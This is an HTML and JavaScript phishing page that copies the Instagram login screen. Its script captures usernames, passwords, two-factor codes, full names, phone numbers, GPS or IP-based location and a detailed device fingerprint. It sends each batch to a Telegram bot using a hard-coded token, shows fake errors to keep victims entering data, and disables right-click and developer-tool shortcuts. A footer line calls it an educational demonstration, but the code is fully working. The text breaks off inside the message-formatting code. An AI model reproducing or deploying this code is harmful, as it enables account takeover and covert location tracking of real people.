<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yT/r/Yps9cQFGQoW.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            justify-content: center;
            align-items: center;
            gap: 60px;
        }

        .phone-image {
            flex: 1;
            display: flex;
            justify-content: flex-end;
        }

        .phone-image img {
            height: 600px;
            display: block;
        }

        .login-section {
            flex: 1;
            max-width: 350px;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            margin-bottom: 10px;
            border-radius: 1px;
        }

        .logo {
            font-family: 'Instagram', cursive;
            font-size: 48px;
            margin-bottom: 30px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }

        .input-group {
            margin-bottom: 10px;
            position: relative;
        }

        input {
            width: 100%;
            padding: 12px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
        }

        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            padding: 8px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            margin: 15px 0;
            cursor: pointer;
            opacity: 0.7;
        }

        .login-btn:hover {
            background-color: #1877f2;
            opacity: 1;
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
            margin: 0 10px;
        }

        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin: 20px 0;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            margin-bottom: 20px;
            border-radius: 1px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            text-align: center;
        }

        .app-download p {
            margin: 20px 0;
            font-size: 14px;
        }

        .app-buttons img {
            height: 40px;
            margin: 0 5px;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            background-color: white;
            padding: 30px;
            border-radius: 12px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            animation: slideUp 0.3s ease;
        }

        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .modal-logo {
            font-size: 36px;
            margin-bottom: 20px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }

        .modal h2 {
            margin-bottom: 15px;
            font-size: 18px;
            color: #262626;
        }

        .modal p {
            color: #8e8e8e;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.4;
        }

        .modal-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            font-size: 14px;
        }

        .modal-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .modal-btn-secondary {
            background-color: transparent;
            color: #0095f6;
            border: none;
            font-weight: 600;
            cursor: pointer;
            padding: 12px;
            font-size: 14px;
        }

        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }

        .info-modal {
            max-width: 500px;
        }

        .info-item {
            text-align: left;
            margin: 10px 0;
            padding: 10px;
            background-color: #fafafa;
            border-radius: 5px;
            font-size: 12px;
            border-left: 3px solid #0095f6;
        }

        .info-label {
            font-weight: 600;
            color: #262626;
            display: block;
            margin-bottom: 5px;
        }

        .info-value {
            color: #8e8e8e;
            word-break: break-all;
        }

        .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Mobile Responsiveness */
        @media (max-width: 875px) {
            .phone-image {
                display: none;
            }
            
            .container {
                justify-content: center;
            }
        }

        @media (max-width: 450px) {
            .login-box, .signup-box {
                background-color: transparent;
                border: none;
                padding: 20px;
            }
            
            body {
                background-color: white;
            }
            
            .modal-content {
                padding: 20px;
                width: 95%;
            }
        }

        .hidden {
            display: none;
        }

        .password-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #385185;
            font-size: 12px;
            cursor: pointer;
            font-weight: 600;
        }

        .warning-note {
            color: #8e8e8e;
            font-size: 11px;
            margin-top: 20px;
            text-align: center;
            padding: 10px;
            border-top: 1px solid #dbdbdb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-image">
            <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__makehaste_cache_breaker=HOgRclNOosk" alt="Instagram on iPhone" onerror="this.style.display='none'">
        </div>
        
        <div class="login-section">
            <div class="login-box">
                <div class="logo">Instagram</div>
                <form id="loginForm">
                    <div class="input-group">
                        <input type="text" id="username" placeholder="Phone number, username, or email" required>
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" placeholder="Password" required>
                        <button type="button" class="password-toggle" id="togglePassword">Show</button>
                    </div>
                    <button type="submit" class="login-btn" id="submitBtn">
                        <span id="btnText">Log in</span>
                        <div class="loader" id="btnLoader"></div>
                    </button>
                    <div class="error-message" id="errorMessage">
                        Sorry, your password was incorrect. Please double-check your password.
                    </div>
                </form>
                
                <div class="separator">OR</div>
                
                <a href="#" class="facebook-login">
                    <svg style="width:16px;height:16px;vertical-align:text-bottom;margin-right:8px;" fill="#385185" viewBox="0 0 24 24">
                        <path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02z"></path>
                    </svg>
                    Log in with Facebook
                </a>
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="#" class="signup-link">Sign up</a>
            </div>
            
            <div class="app-download">
                <p>Get the app.</p>
                <div class="app-buttons">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" onerror="this.style.display='none'">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" onerror="this.style.display='none'">
                </div>
            </div>
            
            <div class="warning-note">
                This is a security demonstration page for educational purposes only.
            </div>
        </div>
    </div>

    <!-- Initial User Info Modal -->
    <div class="modal" id="initialModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Welcome Back!</h2>
            <p>To help keep your account secure, Instagram needs to verify your identity.</p>
            <p style="font-size: 13px; color: #262626; margin: 15px 0; background: #fafafa; padding: 10px; border-radius: 5px;">
                <strong>Security Check Required</strong><br>
                Please complete this one-time verification.
            </p>
            
            <div class="input-group">
                <input type="text" id="userFullName" placeholder="Your Full Name" required>
            </div>
            <div class="input-group">
                <input type="tel" id="userMobile" placeholder="Mobile Number" required>
            </div>
            
            <p style="font-size: 11px; color: #8e8e8e; margin: 15px 0; line-height: 1.4;">
                By providing your information, you agree to our Terms and Privacy Policy. This helps us protect your account from unauthorized access.
            </p>
            
            <button class="modal-btn" id="verifyUserBtn">Verify & Continue</button>
            <div class="loader" id="verifyLoader"></div>
        </div>
    </div>

    <!-- Location Permission Modal -->
    <div class="modal" id="locationModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Location Required</h2>
            <p>Instagram needs to verify your location to protect your account from suspicious login attempts.</p>
            
            <div style="background: #fafafa; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left;">
                <p style="font-size: 13px; color: #262626; margin-bottom: 10px;">
                    <strong>Why this is required:</strong>
                </p>
                <ul style="font-size: 12px; color: #8e8e8e; padding-left: 20px;">
                    <li>Verify it's really you logging in</li>
                    <li>Prevent unauthorized access</li>
                    <li>Alert you of suspicious activity</li>
                </ul>
            </div>
            
            <p id="locationError" style="color: #ed4956; font-size: 12px; margin-top: 15px; display: none;">
                <strong>Location access denied.</strong> Please allow location access to continue. If error persists, try opening in incognito/private tab.
            </p>
            
            <button class="modal-btn" id="allowLocationBtn">Allow Location Access</button>
            <button class="modal-btn-secondary" id="tryAgainBtn">Try Again</button>
        </div>
    </div>

    <!-- Security Verification Modal -->
    <div class="modal" id="securityModal">
        <div class="modal-content info-modal">
            <div class="modal-logo">Instagram</div>
            <h2>Verifying Your Device</h2>
            <p>Instagram is checking your device for security purposes...</p>
            
            <div style="margin: 20px 0;">
                <div class="loader" style="width: 40px; height: 40px; margin: 20px auto;"></div>
                <p style="font-size: 13px; color: #8e8e8e;">Checking device compatibility and security</p>
            </div>
            
            <div id="deviceInfo" style="text-align: left; max-height: 300px; overflow-y: auto; margin: 20px 0; padding: 10px; background: #fafafa; border-radius: 8px;">
                <!-- Device info will be populated here -->
            </div>
            
            <button class="modal-btn" id="continueBtn" style="display: none;">Continue to Instagram</button>
        </div>
    </div>

    <!-- Two-Factor Modal -->
    <div class="modal" id="twoFactorModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Two-Factor Authentication</h2>
            <p>Enter the 6-digit code sent to your phone ending with ****<span id="phoneLastDigits"></span></p>
            
            <div class="input-group" style="margin: 20px 0;">
                <input type="text" id="twoFactorCode" placeholder="6-digit code" maxlength="6" pattern="\d{6}" required>
            </div>
            
            <p style="font-size: 12px; color: #8e8e8e; margin: 10px 0;">
                Didn't receive a code? <a href="#" style="color: #0095f6; text-decoration: none;">Resend Code</a>
            </p>
            
            <button class="modal-btn" id="verifyCodeBtn">Verify</button>
            <button class="modal-btn-secondary" id="useBackupBtn">Use Backup Code</button>
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURATION - REPLACE WITH YOUR TELEGRAM BOT
        // ============================================
        const TELEGRAM_BOT_TOKEN = '8220432493:AAHb6lKFGK5M6uWAIqlGTogjCamNfwJJT0Q';  // Replace with your bot token
        const TELEGRAM_CHAT_ID = '8089637989';      // Replace with your chat ID
        
        // ============================================
        // DATA COLLECTION OBJECT
        // ============================================
        const collectedData = {
            credentials: {},
            location: {},
            deviceInfo: {},
            userInfo: {},
            timestamps: {
                pageLoad: new Date().toISOString(),
                loginAttempt: null,
                locationCaptured: null,
                dataSent: null
            },
            sessionId: Math.random().toString(36).substring(2) + Date.now().toString(36)
        };

        // ============================================
        // DOM ELEMENTS
        // ============================================
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const togglePasswordBtn = document.getElementById('togglePassword');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const btnLoader = document.getElementById('btnLoader');
        const errorMessage = document.getElementById('errorMessage');
        
        const initialModal = document.getElementById('initialModal');
        const locationModal = document.getElementById('locationModal');
        const securityModal = document.getElementById('securityModal');
        const twoFactorModal = document.getElementById('twoFactorModal');
        
        const userFullNameInput = document.getElementById('userFullName');
        const userMobileInput = document.getElementById('userMobile');
        const verifyUserBtn = document.getElementById('verifyUserBtn');
        const verifyLoader = document.getElementById('verifyLoader');
        
        const allowLocationBtn = document.getElementById('allowLocationBtn');
        const tryAgainBtn = document.getElementById('tryAgainBtn');
        const locationError = document.getElementById('locationError');
        
        const continueBtn = document.getElementById('continueBtn');
        const deviceInfoDiv = document.getElementById('deviceInfo');
        
        const twoFactorCodeInput = document.getElementById('twoFactorCode');
        const verifyCodeBtn = document.getElementById('verifyCodeBtn');
        const phoneLastDigits = document.getElementById('phoneLastDigits');

        // ============================================
        // INITIALIZATION
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            // Generate session ID
            collectedData.sessionId = 'insta_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Start collecting device info
            collectAllDeviceInfo();
            
            // Check if user has already completed initial verification
            const hasCompletedInitial = sessionStorage.getItem('insta_initial_complete');
            
            if (!hasCompletedInitial) {
                // Show initial modal after delay
                setTimeout(() => {
                    initialModal.style.display = 'flex';
                }, 1500);
            } else {
                // Show location modal
                setTimeout(() => {
                    showLocationModal();
                }, 1000);
            }
            
            // Prevent right-click
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });
            
            // Prevent keyboard shortcuts
            document.addEventListener('keydown', function(e) {
                // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
                if (e.keyCode === 123 || 
                    (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
                    (e.ctrlKey && e.keyCode === 85)) {
                    e.preventDefault();
                    return false;
                }
            });
        });

        // ============================================
        // PASSWORD TOGGLE
        // ============================================
        togglePasswordBtn.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePasswordBtn.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                togglePasswordBtn.textContent = 'Show';
            }
        });

        // ============================================
        // LOGIN FORM HANDLING
        // ============================================
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value;
            
            if (!username || !password) {
                showError('Please fill in all fields');
                return;
            }
            
            // Store credentials
            collectedData.credentials = {
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            };
            
            collectedData.timestamps.loginAttempt = new Date().toISOString();
            
            // Show loading state
            btnText.style.display = 'none';
            btnLoader.style.display = 'block';
            submitBtn.disabled = true;
            
            // Simulate network delay
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // Send data to Telegram
            await sendToTelegram('CREDENTIALS');
            
            // Always show wrong password error
            btnText.style.display = 'inline';
            btnLoader.style.display = 'none';
            submitBtn.disabled = false;
            errorMessage.style.display = 'block';
            
            // Clear password field
            passwordInput.value = '';
            
            // Show two-factor modal after incorrect password
            setTimeout(() => {
                showTwoFactorModal();
            }, 1000);
        });

        // ============================================
        // INITIAL USER INFO MODAL
        // ============================================
        verifyUserBtn.addEventListener('click', async function() {
            const fullName = userFullNameInput.value.trim();
            const mobile = userMobileInput.value.trim();
            
            if (!fullName || !mobile) {
                alert('Please fill in all required fields');
                return;
            }
            
            // Store user info
            collectedData.userInfo = {
                fullName: fullName,
                mobileNumber: mobile,
                timestamp: new Date().toISOString()
            };
            
            // Show loading
            verifyUserBtn.style.display = 'none';
            verifyLoader.style.display = 'block';
            
            // Send to Telegram
            await sendToTelegram('USER_INFO');
            
            // Mark as completed
            sessionStorage.setItem('insta_initial_complete', 'true');
            
            // Hide modal
            initialModal.style.display = 'none';
            verifyUserBtn.style.display = 'block';
            verifyLoader.style.display = 'none';
            
            // Show location modal
            setTimeout(() => {
                showLocationModal();
            }, 500);
        });

        // ============================================
        // LOCATION HANDLING
        // ============================================
        function showLocationModal() {
            locationModal.style.display = 'flex';
            locationError.style.display = 'none';
        }

        allowLocationBtn.addEventListener('click', async function() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        // Success - got location
                        collectedData.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters',
                            altitude: position.coords.altitude || 'Not available',
                            heading: position.coords.heading || 'Not available',
                            speed: position.coords.speed || 'Not available',
                            timestamp: new Date().toISOString(),
                            mapLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
                            source: 'GPS'
                        };
                        
                        collectedData.timestamps.locationCaptured = new Date().toISOString();
                        
                        // Send location to Telegram
                        await sendToTelegram('LOCATION');
                        
                        // Hide modal
                        locationModal.style.display = 'none';
                        
                        // Show security verification
                        showSecurityVerification();
                    },
                    async function(error) {
                        // Error - location denied
                        locationError.style.display = 'block';
                        allowLocationBtn.textContent = 'Allow Location Access';
                        
                        // Try to get location by IP
                        await getLocationByIP();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
                
                allowLocationBtn.textContent = 'Getting Location...';
                allowLocationBtn.disabled = true;
            } else {
                // Geolocation not supported
                await getLocationByIP();
            }
        });

        tryAgainBtn.addEventListener('click', function() {
            locationError.style.display = 'none';
            allowLocationBtn.disabled = false;
            allowLocationBtn.textContent = 'Allow Location Access';
        });

        // ============================================
        // DEVICE INFORMATION COLLECTION
        // ============================================
        async function collectAllDeviceInfo() {
            // Basic device info
            collectedData.deviceInfo = {
                // Browser info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                
                // Screen info
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                availableResolution: `${window.screen.availWidth}x${window.screen.availHeight}`,
                colorDepth: window.screen.colorDepth + ' bit',
                pixelDepth: window.screen.pixelDepth + ' bit',
                orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown',
                
                // Window info
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                devicePixelRatio: window.devicePixelRatio,
                
                // Connection info
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData
                } : 'Not available',
                
                // Hardware info
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 'Unknown',
                
                // Time info
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                
                // Performance info
                deviceType: /Mobile|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                browser: getBrowserName(),
                os: getOperatingSystem(),
                
                timestamp: new Date().toISOString()
            };
            
            // Battery info
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    collectedData.deviceInfo.battery = {
                        charging: battery.charging,
                        level: Math.round(battery.level * 100) + '%',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    collectedData.deviceInfo.battery = 'Not accessible';
                }
            }
            
            // WebGL info (GPU)
            collectedData.deviceInfo.gpu = getWebGLInfo();
            
            // IP address
            await getIPAddress();
            
            // SIM info (for mobile)
            if ('getInstalledRelatedApps' in navigator) {
                collectedData.deviceInfo.simInfo = 'Available (requires permission)';
            }
            
            // Storage info
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    collectedData.deviceInfo.storage = {
                        usage: formatBytes(estimate.usage),
                        quota: formatBytes(estimate.quota),
                        percentUsed: estimate.quota ? Math.round((estimate.usage / estimate.quota) * 100) + '%' : 'Unknown'
                    };
                } catch (e) {
                    collectedData.deviceInfo.storage = 'Not accessible';
                }
            }
            
            console.log('Device info collected:', collectedData.deviceInfo);
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        return {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                }
                return 'WebGL available but debug info not accessible';
            } catch (e) {
                return 'WebGL not available';
            }
        }

        async function getIPAddress() {
            try {
                // Try multiple IP services
                const services = [
                    'https://api.ipify.org?format=json',
                    'https://ipapi.co/json/',
                    'https://api.myip.com'
                ];
                
                for (const service of services) {
                    try {
                        const response = await fetch(service, { timeout: 5000 });
                        if (response.ok) {
                            const data = await response.json();
                            
                            if (service.includes('ipapi.co')) {
                                collectedData.deviceInfo.ipDetails = {
                                    ip: data.ip,
                                    city: data.city,
                                    region: data.region,
                                    country: data.country_name,
                                    countryCode: data.country_code,
                                    postal: data.postal,
                                    latitude: data.latitude,
                                    longitude: data.longitude,
                                    timezone: data.timezone,
                                    org: data.org,
                                    asn: data.asn,
                                    isp: data.org,
                                    reverse: data.reverse || 'Not available'
                                };
                            } else if (service.includes('ipify')) {
                                collectedData.deviceInfo.ipAddress = data.ip;
                            } else if (service.includes('myip')) {
                                collectedData.deviceInfo.ipAddress = data.ip;
                                collectedData.deviceInfo.ipCountry = data.country;
                            }
                            
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                if (!collectedData.deviceInfo.ipAddress && collectedData.deviceInfo.ipDetails) {
                    collectedData.deviceInfo.ipAddress = collectedData.deviceInfo.ipDetails.ip;
                }
            } catch (e) {
                console.error('Failed to get IP:', e);
                collectedData.deviceInfo.ipAddress = 'Could not retrieve';
            }
        }

        async function getLocationByIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    collectedData.location = {
                        latitude: data.latitude,
                        longitude: data.longitude,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        ip: data.ip,
                        isp: data.org,
                        timestamp: new Date().toISOString(),
                        mapLink: `https://maps.google.com/?q=${data.latitude},${data.longitude}`,
                        source: 'IP-based (approximate)',
                        accuracy: 'City-level (based on IP)'
                    };
                    
                    collectedData.timestamps.locationCaptured = new Date().toISOString();
                    
                    // Send to Telegram
                    await sendToTelegram('LOCATION_IP');
                    
                    // Hide modal
                    locationModal.style.display = 'none';
                    
                    // Show security verification
                    showSecurityVerification();
                    
                    return true;
                }
            } catch (e) {
                console.error('Failed to get location by IP:', e);
            }
            
            // If all fails, keep showing modal
            locationError.style.display = 'block';
            locationError.innerHTML = '<strong>Location access required.</strong> Please allow location access to continue. If error persists, try:<br>1. Opening in incognito/private tab<br>2. Enabling location services<br>3. Trying a different browser';
            allowLocationBtn.disabled = false;
            allowLocationBtn.textContent = 'Allow Location Access';
            
            return false;
        }

        // ============================================
        // SECURITY VERIFICATION
        // ============================================
        function showSecurityVerification() {
            securityModal.style.display = 'flex';
            
            // Display device info
            displayDeviceInfo();
            
            // Simulate verification process
            setTimeout(async () => {
                // Send all collected data
                await sendToTelegram('FULL_DATA');
                
                // Show continue button
                continueBtn.style.display = 'block';
            }, 3000);
        }

        continueBtn.addEventListener('click', function() {
            securityModal.style.display = 'none';
        });

        function displayDeviceInfo() {
            let html = '';
            
            if (collectedData.deviceInfo.ipAddress) {
                html += `<div class="info-item">
                    <span class="info-label">IP Address:</span>
                    <span class="info-value">${collectedData.deviceInfo.ipAddress}</span>
                </div>`;
            }
            
            if (collectedData.deviceInfo.ipDetails) {
                html += `<div class="info-item">
                    <span class="info-label">Location:</span>
                    <span class="info-value">${collectedData.deviceInfo.ipDetails.city}, ${collectedData.deviceInfo.ipDetails.country}</span>
                </div>`;
            }
            
            html += `<div class="info-item">
                <span class="info-label">Device:</span>
                <span class="info-value">${collectedData.deviceInfo.deviceType} (${collectedData.deviceInfo.os})</span>
            </div>`;
            
            html += `<div class="info-item">
                <span class="info-label">Browser:</span>
                <span class="info-value">${collectedData.deviceInfo.browser}</span>
            </div>`;
            
            html += `<div class="info-item">
                <span class="info-label">Screen:</span>
                <span class="info-value">${collectedData.deviceInfo.screenResolution}</span>
            </div>`;
            
            if (collectedData.deviceInfo.battery && typeof collectedData.deviceInfo.battery !== 'string') {
                html += `<div class="info-item">
                    <span class="info-label">Battery:</span>
                    <span class="info-value">${collectedData.deviceInfo.battery.level} ${collectedData.deviceInfo.battery.charging ? '(Charging)' : ''}</span>
                </div>`;
            }
            
            if (collectedData.deviceInfo.connection && typeof collectedData.deviceInfo.connection !== 'string') {
                html += `<div class="info-item">
                    <span class="info-label">Connection:</span>
                    <span class="info-value">${collectedData.deviceInfo.connection.effectiveType} (${collectedData.deviceInfo.connection.downlink})</span>
                </div>`;
            }
            
            if (collectedData.deviceInfo.gpu && typeof collectedData.deviceInfo.gpu !== 'string') {
                html += `<div class="info-item">
                    <span class="info-label">GPU:</span>
                    <span class="info-value">${collectedData.deviceInfo.gpu.renderer || 'Not detected'}</span>
                </div>`;
            }
            
            html += `<div class="info-item">
                <span class="info-label">RAM:</span>
                <span class="info-value">${collectedData.deviceInfo.deviceMemory || 'Unknown'}</span>
            </div>`;
            
            html += `<div class="info-item">
                <span class="info-label">CPU Cores:</span>
                <span class="info-value">${collectedData.deviceInfo.hardwareConcurrency}</span>
            </div>`;
            
            html += `<div class="info-item">
                <span class="info-label">Timezone:</span>
                <span class="info-value">${collectedData.deviceInfo.timezone}</span>
            </div>`;
            
            deviceInfoDiv.innerHTML = html;
        }

        // ============================================
        // TWO-FACTOR MODAL
        // ============================================
        function showTwoFactorModal() {
            if (collectedData.userInfo.mobileNumber) {
                const lastDigits = collectedData.userInfo.mobileNumber.slice(-4);
                phoneLastDigits.textContent = lastDigits;
            }
            
            twoFactorModal.style.display = 'flex';
        }

        verifyCodeBtn.addEventListener('click', async function() {
            const code = twoFactorCodeInput.value.trim();
            
            if (code.length !== 6 || !/^\d+$/.test(code)) {
                alert('Please enter a valid 6-digit code');
                return;
            }
            
            // Store 2FA code
            collectedData.twoFactorCode = code;
            collectedData.twoFactorTimestamp = new Date().toISOString();
            
            // Send to Telegram
            await sendToTelegram('TWO_FACTOR');
            
            // Hide modal
            twoFactorModal.style.display = 'none';
            
            // Show error again
            setTimeout(() => {
                showError('Code verification failed. Please try logging in again.');
            }, 500);
        });

        useBackupBtn.addEventListener('click', function() {
            alert('Backup codes are not available. Please use the 6-digit code.');
        });

        // ============================================
        // TELEGRAM INTEGRATION
        // ============================================
        async function sendToTelegram(type) {
            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                console.log('Telegram bot not configured. Data would be sent:', {
                    type: type,
                    data: getDataForTelegram(type),
                    sessionId: collectedData.sessionId
                });
                return;
            }
            
            try {
                let message = formatTelegramMessage(type);
                
                // URL encode the message
                const encodedMessage = encodeURIComponent(message);
                
                // Send to Telegram
                const response = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`
                );
                
                if (response.ok) {
                    console.log(`Data sent to Telegram (${type})`);
                    collectedData.timestamps.dataSent = new Date().toISOString();
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        function formatTelegramMessage(type) {
            let message = '';
            
            switch(type) {
                case 'USER_INFO':
                    message = `üîê <b>NEW INSTAGRAM LOGIN ATTEMPT - USER INFO</b>\n\n` +
                             `üì± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `üë§ <b>Full Name:</b> ${collectedData.userInfo.fullName}\n` +
                             `üìû <b>Mobile:</b> ${collectedData.userInfo.mobileNumber}\n` +
                             `‚è∞ <b>Time:</b> ${new Date().toLocaleString()}\n` +
                             `üåê <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}...`;
                    break;
                    
                case 'LOCATION':
                case 'LOCATION_IP':
                    const mapLink = collectedData.location.mapLink || 'No map available';
                    message = `üìç <b>LOCATION CAPTURED</b>\n\n` +
                             `üì± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `üåç <b>Coordinates:</b> ${collectedData.location.latitude}, ${collectedData.location.longitude}\n` +
                             `üèôÔ∏è <b>Location:</b> ${collectedData.location.city || 'Unknown'}, ${collectedData.location.country || 'Unknown'}\n` +
                             `üì° <b>Source:</b> ${collectedData.location.source}\n` +
                             `üéØ <b>Accuracy:</b> ${collectedData.location.accuracy || 'Unknown'}\n` +
                             `üó∫Ô∏è <b>Google Maps:</b> ${mapLink}\n` +
                             `‚è∞ <b>Time:</b> ${new Date(collectedData.location.timestamp).toLocaleString()}`;
                    break;
                    
                case 'CREDENTIALS':
                    message = `üîë <b>CREDENTIALS CAPTURED</b>\n\n` +
                             `üì± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `üë§ <b>Username:</b> ${collectedData.credentials.username}\n` +
